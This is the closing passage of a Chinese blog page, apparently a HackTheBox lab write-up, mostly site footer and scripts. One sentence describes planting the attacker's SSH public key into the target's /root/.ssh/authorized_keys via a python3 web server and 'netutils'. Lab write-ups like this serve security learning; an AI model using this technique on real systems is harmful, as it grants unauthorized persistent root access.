+<p>同时把本机的ssh公钥传到靶机上并命名为<code>index.html</code>,python3建立一个服务器,将公钥通过<code>netutils</code>下载并保存到<code>/root/.ssh/authorized_keys</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203300032361.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-30</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-meta/" class="prev" rel="prev" title="HackTheBox-Meta"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Meta</a>
+            <a href="/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/" class="next" rel="next" title="Cobalt Strike">Cobalt Strike<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
